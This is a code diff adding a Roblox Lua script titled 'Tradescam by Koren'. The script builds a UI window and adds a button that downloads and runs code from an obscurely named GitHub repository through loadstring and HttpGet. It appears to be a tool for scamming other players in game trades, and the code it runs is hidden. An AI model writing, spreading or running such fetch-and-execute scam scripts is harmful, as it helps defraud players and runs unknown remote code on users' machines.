@@ -1,0 +1,16 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Tradescam by Koren", HidePremium = false, SaveConfig = true, ConfigFolder = "Koren"})
+local Tab = Window:MakeTab({
+	Name = "Tradescam",
+	Icon = "rbxassetid://10030921206",
+	PremiumOnly = false
+})
+local Section = Tab:AddSection({
+	Name = "Tradescam ENJOY"
+})
+Tab:AddButton({
+	Name = "Tradescam",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/korenscript/fadsfdsasfas/main/fdsafsdfasd"))()
+  	end    
+})
